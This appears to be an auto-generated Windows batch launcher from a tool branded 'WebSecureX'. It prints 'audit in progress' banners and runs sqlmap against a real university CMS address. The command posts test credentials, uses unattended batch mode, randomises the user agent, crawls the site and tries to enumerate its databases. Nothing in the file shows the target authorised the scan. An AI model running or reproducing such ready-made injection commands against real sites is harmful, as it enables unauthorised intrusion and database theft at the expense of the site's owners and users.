@echo off
title sqlmap SQL INJECTION ENGINE
color 0A
echo.
echo  [ WebSecureX ] ENGINE: sqlmap SQL INJECTION ENGINE
echo  Powered by WebSecureX Security Platform
echo.
echo  Target: https://cms.pu.edu.pk/
echo.
echo ============================================================
echo  AUDIT IN PROGRESS — DO NOT CLOSE THIS WINDOW
echo ============================================================
echo.
E:\WebSecureX.(2)\venv\Scripts\python.exe ..\engines\sqli_engine\sqlmap\sqlmap.py -u https://cms.pu.edu.pk/ --data=username=test&password=test --batch --random-agent --dbs --crawl=2 --threads=3 --level=1 --risk=1 --output-dir=E:\WebSecureX.(2)\python-backend\reports\aed735b0-69a5-430e-b08d-61bd69e44511\sqlmap
echo.
echo ============================================================
echo  SCAN COMPLETE — This window closes in 30 seconds
echo ============================================================
timeout /t 30 /nobreak > nul